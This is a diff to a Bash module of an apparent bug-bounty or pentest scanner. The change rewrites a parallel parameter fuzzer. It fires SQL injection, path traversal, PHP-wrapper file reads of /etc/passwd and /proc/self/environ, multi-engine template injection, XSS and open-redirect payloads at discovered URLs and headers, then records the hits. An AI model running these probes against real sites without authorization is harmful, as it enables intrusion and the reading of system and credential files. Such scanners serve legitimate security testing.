@@ -20,159 +20,244 @@ MODULE_NAME="param_discovery"
 MODULE_DESC="Descubrimiento de parámetros ocultos (paramspider + arjun + fuzz)"
 
 # ── Fuzzing genérico de parámetros descubiertos ───────────────
-# Aplica payloads universales a cada param encontrado — agnóstico de stack.
-# Detecta: SQLi error-based, LFI, SSTI, XSS reflection, open redirect.
+# Aplica payloads universales a TODOS los params encontrados — sin cap.
+# Workers paralelos con semáforo para no bloquear el host.
+# Detecta: SQLi error-based, LFI (multi-payload+encoding), SSTI (multi-engine),
+#          XSS reflection, open redirect.
 _param_fuzz() {
-  local PARAMS_FILE="$1"   # archivo con URLs?param=FUZZ
+  local PARAMS_FILE="$1"
   local DOMAIN_ID="$2"
   local DOMAIN="$3"
 
   [[ ! -s "$PARAMS_FILE" ]] && return
 
-  local MAX_URLS=60
-  local FINDINGS=0
-
-  # Payloads por categoría de parámetro
-  # Cada entrada: "CATEGORY:PAYLOAD" — CATEGORY determina qué parámetros la reciben
-  declare -A CAT_PAYLOADS
-  CAT_PAYLOADS[sqli]="'"
-  CAT_PAYLOADS[ssti]='{{7*7}}'
-  CAT_PAYLOADS[xss]='<hackeadora>'
-  CAT_PAYLOADS[lfi]='../../../etc/passwd'
-  CAT_PAYLOADS[redirect]='//oastify.com'
-
+  local MAX_WORKERS=20          # paralelo controlado
+  local FINDINGS_FILE
+  FINDINGS_FILE=$(mktemp /tmp/pf_findings.XXXXXX)
+  local DONE_FILE
+  DONE_FILE=$(mktemp /tmp/pf_done.XXXXXX)
   local URL_COUNT=0
-  while IFS= read -r URL; do
-    [[ -z "$URL" ]] && continue
-    [[ "$URL" =~ \.(js|css|png|jpg|gif|svg|woff|ico|map)(\?|$) ]] && continue
-    (( URL_COUNT++ > MAX_URLS )) && break
 
+  # ── LFI: payloads con encodings + wrappers PHP ───────────────
+  local -a LFI_PAYLOADS=(
+    '../../../etc/passwd'
+    '....//....//....//etc/passwd'
+    '../../../etc/passwd%00'
+    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+    '..%2f..%2f..%2fetc%2fpasswd'
+    'php://filter/convert.base64-encode/resource=/etc/passwd'
+    'php://filter/read=convert.base64-encode/resource=../../../etc/passwd'
+    '../../../proc/self/environ'
+    '../../../windows/win.ini'
+    '..\..\..\windows\win.ini'
+  )
+  # Patrones de detección LFI (Linux + Windows + PHP wrapper base64)
+  local LFI_DETECT='root:[x*]?:[0-9]+:[0-9]+:|/bin/(bash|sh|nologin)|www-data:|daemon:|HTTP_USER_AGENT|DB_PASS|database_password|\[boot loader\]\s*\[operating systems\]|[a-zA-Z0-9+/]{40,}={0,2}'
+
+  # ── SSTI: múltiples engines ──────────────────────────────────
+  # Cada entrada: "payload:::marker_en_respuesta"
+  local -a SSTI_PROBES=(
+    '{{7*7}}:::49'          # Jinja2, Twig, Pebble
+    '${7*7}:::49'           # Freemarker, Groovy, Spring EL
+    '<%= 7*7 %>:::49'       # ERB (Ruby), JSP EL
+    '{7*7}:::49'            # Smarty, Plates
+    '#{7*7}:::49'           # Thymeleaf (Spring)
+    '{{7*"7"}}:::7777777'   # Jinja2 string multiply
+  )
+
+  # ── Worker: testa una URL completa ──────────────────────────
+  _fuzz_url() {
+    local URL="$1"
     local BASE="${URL%%\?*}"
     local QUERY="${URL#*\?}"
 
-    # Detectar si el endpoint requiere POST: probar GET primero, si da 4xx reintentar POST
+    # Baseline: detectar método
     local BASELINE_STATUS METHOD="GET"
     BASELINE_STATUS=$(curl -s --max-time 8 -A "${SCAN_UA:-Mozilla/5.0}" \
       -o /dev/null -w "%{http_code}" "$BASE" 2>/dev/null)
     if [[ "$BASELINE_STATUS" =~ ^(000|4[0-9][0-9])$ ]]; then
-      # Intentar POST con los params como form body
       BASELINE_STATUS=$(curl -s --max-time 8 -A "${SCAN_UA:-Mozilla/5.0}" -X POST \
         --data-urlencode "" -o /dev/null -w "%{http_code}" "$BASE" 2>/dev/null)
-      [[ "$BASELINE_STATUS" =~ ^(000|4[0-9][0-9])$ ]] && continue
+      [[ "$BASELINE_STATUS" =~ ^(000|4[0-9][0-9])$ ]] && return
       METHOD="POST"
     fi
 
-    # Para cada parámetro en la URL
-    while IFS='=' read -r PNAME _PVAL; do
+    _send_payload() {
+      local U="$1" PNAME="$2" PAYLOAD="$3" M="$4" Q="$5"
+      local ENC_PAYLOAD B="${U%%\?*}"
+      ENC_PAYLOAD=$(python3 -c \
+        "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1],safe=''))" \
+        "$PAYLOAD" 2>/dev/null || printf '%s' "$PAYLOAD")
+      local RESP
+      if [[ "$M" == "POST" ]]; then
+        local PB
+        PB=$(echo "$Q" | tr '&' '\n' | \
+          sed -E "s|^(${PNAME}=).*|\1${ENC_PAYLOAD}|" | \
+          tr '\n' '&' | sed 's/&$//')
+        RESP=$(curl -s --max-time 10 -A "${SCAN_UA:-Mozilla/5.0}" -X POST \
+          -d "$PB" -w "\n###S###%{http_code}" "$B" 2>/dev/null)
+      else
+        local TU
+        TU=$(echo "$U" | sed -E "s|([?&]${PNAME}=)[^&]*|\1${ENC_PAYLOAD}|")
+        RESP=$(curl -s --max-time 10 -A "${SCAN_UA:-Mozilla/5.0}" \
+          -w "\n###S###%{http_code}" "$TU" 2>/dev/null)
+      fi
+      echo "$RESP"
+    }
+
+    while IFS='=' read -r PNAME _; do
       [[ -z "$PNAME" || "$PNAME" == "FUZZ" ]] && continue
       local PNAME_CLEAN="${PNAME// /}"
 
-      # Determinar qué categorías aplican a este param
-      local CATS=("sqli" "ssti" "xss")
-      if echo "$PNAME_CLEAN" | grep -qiE "^(file|path|include|page|load|template|src|dest|url|redirect|next|return|href|link|uri|location)$"; then
-        CATS+=("lfi" "redirect")
+      # ── SQLi ──────────────────────────────────────────────
+      local R
+      R=$(_send_payload "$URL" "$PNAME_CLEAN" "'" "$METHOD" "$QUERY")
+      local RBODY="${R%###S###*}"
+      if echo "$RBODY" | grep -qiE \
+        "sql syntax|mysql_fetch|ORA-[0-9]{4,}|postgresql.*error|sqlite.*error|\
+odbc.*driver|unclosed quotation|syntax error.*near|you have an error in your sql|\
+warning.*mysql|division by zero|supplied argument is not a valid|pg_query\(\)|DB Error"; then
+        echo "sqli_error|high|${URL}|SQLi error-based en param '${PNAME_CLEAN}'" \
+          >> "$FINDINGS_FILE"
       fi
 
-      for CAT in "${CATS[@]}"; do
-        local PAYLOAD="${CAT_PAYLOADS[$CAT]}"
-        local ENC_PAYLOAD
-        ENC_PAYLOAD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" \
-          "$PAYLOAD" 2>/dev/null || printf '%s' "$PAYLOAD")
-
-        # Construir request: GET con querystring o POST con form body
-        local RESP_BODY RESP_STATUS
-        if [[ "$METHOD" == "POST" ]]; then
-          # Reconstruir todos los params como POST body, sustituir el param objetivo
-          local POST_BODY
-          POST_BODY=$(echo "$QUERY" | tr '&' '\n' | sed -E \
-            "s|^(${PNAME_CLEAN}=).*|\1${ENC_PAYLOAD}|" | tr '\n' '&' | sed 's/&$//')
-          RESP_BODY=$(curl -s --max-time 10 -A "${SCAN_UA:-Mozilla/5.0}" -X POST \
-            -d "$POST_BODY" -w "\n###STATUS###%{http_code}" "$BASE" 2>/dev/null)
-        else
-          local TEST_URL
-          TEST_URL=$(echo "$URL" | sed -E "s|([?&]${PNAME_CLEAN}=)[^&]*|\1${ENC_PAYLOAD}|")
-          RESP_BODY=$(curl -s --max-time 10 -A "${SCAN_UA:-Mozilla/5.0}" \
-            -w "\n###STATUS###%{http_code}" "$TEST_URL" 2>/dev/null)
+      # ── SSTI ─────────────────────────────────────────────
+      local PROBE MARKER
+      for PROBE_ENTRY in "${SSTI_PROBES[@]}"; do
+        PROBE="${PROBE_ENTRY%:::*}"
+        MARKER="${PROBE_ENTRY#*:::}"
+        R=$(_send_payload "$URL" "$PNAME_CLEAN" "$PROBE" "$METHOD" "$QUERY")
+        RBODY="${R%###S###*}"
+        if echo "$RBODY" | grep -qF "$MARKER"; then
+          echo "ssti|critical|${URL}|SSTI confirmado (${PROBE}=${MARKER}) en param '${PNAME_CLEAN}'" \
+            >> "$FINDINGS_FILE"
+          break
         fi
-        RESP_STATUS=$(echo "$RESP_BODY" | grep -oP '(?<=###STATUS###)\d+' | tail -1)
-        RESP_BODY=$(echo "$RESP_BODY" | grep -v "###STATUS###")
-
-        case "$CAT" in
-          sqli)
-            if echo "$RESP_BODY" | grep -qiE \
-              "sql syntax|mysql_fetch|ora-[0-9]{4,}|postgresql.*error|sqlite.*error|\
-odbc.*driver|unclosed quotation|syntax error.*near|you have an error in your sql|\
-warning.*mysql|division by zero|supplied argument is not a valid"; then
-              log_warn "  ⚡ SQLi error-based: $TEST_URL (param: $PNAME_CLEAN)"
-              db_add_finding "$DOMAIN_ID" "sqli_error" "high" "$TEST_URL" \
-                "param_sqli" "SQLi error en param '$PNAME_CLEAN'"
-              notify_nuclei_finding "$DOMAIN" "sqli-error" "high" "$TEST_URL" \
-                "param='$PNAME_CLEAN' payload=quote"
-              ((FINDINGS++))
-            fi
-            ;;
-          ssti)
-            if echo "$RESP_BODY" | grep -qE '\b49\b'; then
-              log_warn "  ⚡ SSTI ({{7*7}}=49): $TEST_URL (param: $PNAME_CLEAN)"
-              db_add_finding "$DOMAIN_ID" "ssti" "critical" "$TEST_URL" \
-                "param_ssti" "SSTI confirmado: {{7*7}}=49 en param '$PNAME_CLEAN'"
-              notify_nuclei_finding "$DOMAIN" "ssti" "critical" "$TEST_URL" \
-                "param='$PNAME_CLEAN'"
-              ((FINDINGS++))
-            fi
-            ;;
-          xss)
-            if echo "$RESP_BODY" | grep -qF '<hackeadora>'; then
-              log_warn "  ⚡ XSS reflection: $TEST_URL (param: $PNAME_CLEAN)"
-              # dalfox para confirmar y encontrar payload completo explotable
-              if command -v dalfox &>/dev/null; then
-                local DALFOX_OUT
-                DALFOX_OUT=$(dalfox url "$TEST_URL" \
-                  --silence --no-spinner --timeout 15 \
-                  --user-agent "${SCAN_UA:-Mozilla/5.0}" \
-                  2>/dev/null | grep -i "POC\|XSS" | head -3)
-                [[ -n "$DALFOX_OUT" ]] && \
-                  log_warn "  dalfox: $DALFOX_OUT"
-              fi
-              db_add_finding "$DOMAIN_ID" "xss_reflect" "medium" "$TEST_URL" \
-                "param_xss" "XSS reflection en param '$PNAME_CLEAN'"
-              notify_nuclei_finding "$DOMAIN" "xss-reflect" "medium" "$TEST_URL" \
-                "param='$PNAME_CLEAN'"
-              ((FINDINGS++))
-            fi
-            ;;
-          lfi)
-            if echo "$RESP_BODY" | grep -qE 'root:.*:0:0:|/bin/(bash|sh)|www-data:'; then
-              log_warn "  ⚡ LFI confirmado: $TEST_URL (param: $PNAME_CLEAN)"
-              db_add_finding "$DOMAIN_ID" "lfi" "critical" "$TEST_URL" \
-                "param_lfi" "LFI en param '$PNAME_CLEAN'"
-              notify_nuclei_finding "$DOMAIN" "lfi" "critical" "$TEST_URL" \
-                "param='$PNAME_CLEAN'"
-              ((FINDINGS++))
-            fi
-            ;;
-          redirect)
-            if [[ "$RESP_STATUS" =~ ^3 ]]; then
-              local LOC
-              LOC=$(curl -sI --max-time 8 -A "${SCAN_UA:-Mozilla/5.0}" \
-                "$TEST_URL" 2>/dev/null | grep -i '^location:' | head -1)
-              if echo "$LOC" | grep -qi "oastify\.com\|evil\.com"; then
-                log_warn "  ⚡ Open redirect: $TEST_URL (param: $PNAME_CLEAN)"
-                db_add_finding "$DOMAIN_ID" "open_redirect" "medium" "$TEST_URL" \
-                  "param_redirect" "Open redirect en param '$PNAME_CLEAN' → $LOC"
-                notify_nuclei_finding "$DOMAIN" "open-redirect" "medium" "$TEST_URL" \
-                  "param='$PNAME_CLEAN'"
-                ((FINDINGS++))
-              fi
-            fi
-            ;;
-        esac
       done
-    done < <(echo "$QUERY" | tr '&' '\n')
-  done < "$PARAMS_FILE"
 
-  [[ "$FINDINGS" -gt 0 ]] && \
-    log_ok "  param_fuzz: $FINDINGS findings en $URL_COUNT URLs"
+      # ── XSS ──────────────────────────────────────────────
+      R=$(_send_payload "$URL" "$PNAME_CLEAN" '<h4ckeadora>' "$METHOD" "$QUERY")
+      RBODY="${R%###S###*}"
+      if echo "$RBODY" | grep -qF '<h4ckeadora>'; then
+        # Confirmar con dalfox si disponible
+        local DALFOX_OUT=""
+        if command -v dalfox &>/dev/null; then
+          DALFOX_OUT=$(dalfox url "$URL" \
+            --silence --no-spinner --timeout 15 \
+            --user-agent "${SCAN_UA:-Mozilla/5.0}" \
+            2>/dev/null | grep -i "POC\|XSS" | head -3)
+        fi
+        echo "xss_reflect|medium|${URL}|XSS reflection param '${PNAME_CLEAN}' dalfox=${DALFOX_OUT}" \
+          >> "$FINDINGS_FILE"
+      fi
+
+      # ── LFI — sólo en params con nombres sospechosos ─────
+      if echo "$PNAME_CLEAN" | grep -qiE \
+        "^(file|path|include|page|load|template|src|doc|document|folder|root|\
+read|pg|php_path|style|pdf|fn|filename|dir|directory|module|content|layout|conf|config)$"; then
+        local LFI_HIT=0
+        local USED_PAYLOAD=""
+        for LFI_P in "${LFI_PAYLOADS[@]}"; do
+          R=$(_send_payload "$URL" "$PNAME_CLEAN" "$LFI_P" "$METHOD" "$QUERY")
+          RBODY="${R%###S###*}"
+          # PHP wrapper: el body será base64, buscar longitud razonable
+          if echo "$RBODY" | grep -qE "$LFI_DETECT"; then
+            LFI_HIT=1
+            USED_PAYLOAD="$LFI_P"
+            break
+          fi
+        done
+        if [[ "$LFI_HIT" -eq 1 ]]; then
+          echo "lfi|critical|${URL}|LFI en param '${PNAME_CLEAN}' payload='${USED_PAYLOAD}'" \
+            >> "$FINDINGS_FILE"
+        fi
+      fi
+
+      # ── Open Redirect ─────────────────────────────────────
+      if echo "$PNAME_CLEAN" | grep -qiE \
+        "^(url|redirect|next|dest|target|href|link|uri|location|return|ref|goto|redir|forward|continue|back)$"; then
+        R=$(_send_payload "$URL" "$PNAME_CLEAN" '//a.fernandes.es' "$METHOD" "$QUERY")
+        local RSTATUS="${R##*###S###}"
+        if [[ "$RSTATUS" =~ ^3 ]]; then
+          local LOC
+          LOC=$(curl -sI --max-time 8 -A "${SCAN_UA:-Mozilla/5.0}" \
+            "$(echo "$URL" | sed -E "s|([?&]${PNAME_CLEAN}=)[^&]*|\1%2F%2Fa.fernandes.es|")" \
+            2>/dev/null | grep -i '^location:' | head -1)
+          if echo "$LOC" | grep -qi "a\.fernandes\.es"; then
+            echo "open_redirect|medium|${URL}|Open redirect param '${PNAME_CLEAN}' → ${LOC}" \
+              >> "$FINDINGS_FILE"
+          fi
+        fi
+      fi
+
+    done < <(echo "$QUERY" | tr '&' '\n')
+
+    # ── SSTI en headers — independiente de params ─────────────
+    # Muchos frameworks renderizan User-Agent, Referer y headers custom
+    # directamente en templates (logging, error pages, email templates, etc.)
+    local SSTI_HEADERS=(
+      "User-Agent"
+      "Referer"
+      "X-Forwarded-For"
+      "X-Forwarded-Host"
+      "X-Original-URL"
+      "X-Custom-IP-Authorization"
+      "X-Api-Version"
+      "Accept-Language"
+      "X-Filename"
+      "X-Template"
+    )
+    local PROBE_ENTRY PROBE MARKER HDR
+    for PROBE_ENTRY in "${SSTI_PROBES[@]}"; do
+      PROBE="${PROBE_ENTRY%:::*}"
+      MARKER="${PROBE_ENTRY#*:::}"
+      for HDR in "${SSTI_HEADERS[@]}"; do
+        local HRESP HBODY
+        HRESP=$(curl -s --max-time 10 -A "${SCAN_UA:-Mozilla/5.0}" \
+          -H "${HDR}: ${PROBE}" \
+          -w "\n###S###%{http_code}" "$BASE" 2>/dev/null)
+        HBODY="${HRESP%###S###*}"
+        if echo "$HBODY" | grep -qF "$MARKER"; then
+          echo "ssti|critical|${URL}|SSTI en header '${HDR}' (${PROBE}=${MARKER})" \
+            >> "$FINDINGS_FILE"
+          break 2
+        fi
+      done
+    done
+  }
+
+  # ── Dispatcher paralelo con semáforo ─────────────────────────
+  local ACTIVE=0
+  while IFS= read -r URL; do
+    [[ -z "$URL" ]] && continue
+    [[ "$URL" =~ \.(js|css|png|jpg|gif|svg|woff|ico|map|ttf|woff2)(\?|$) ]] && continue
+    (( URL_COUNT++ ))
+
+    ( _fuzz_url "$URL" ) &
+
+    (( ++ACTIVE ))
+    if (( ACTIVE >= MAX_WORKERS )); then
+      wait -n 2>/dev/null || wait
+      ACTIVE=0
+    fi
+  done < "$PARAMS_FILE"
+  wait
+
+  # ── Procesar resultados y guardar en DB ───────────────────────
+  local FINDINGS=0
+  while IFS='|' read -r FTYPE FSEV FURL FDETAIL; do
+    [[ -z "$FTYPE" ]] && continue
+    log_warn "  ⚡ ${FTYPE}: ${FURL} — ${FDETAIL}"
+    db_add_finding "$DOMAIN_ID" "$FTYPE" "$FSEV" "$FURL" \
+      "param_fuzz" "$FDETAIL"
+    notify_nuclei_finding "$DOMAIN" "$FTYPE" "$FSEV" "$FURL" "$FDETAIL"
+    (( FINDINGS++ ))
+  done < "$FINDINGS_FILE"
+
+  rm -f "$FINDINGS_FILE" "$DONE_FILE"
+
+  log_ok "  param_fuzz: $FINDINGS findings en $URL_COUNT URLs (${MAX_WORKERS} workers paralelos)"
 }
 
 # ── Parsear salida JSON de arjun (robusta ante cambios de versión) ──
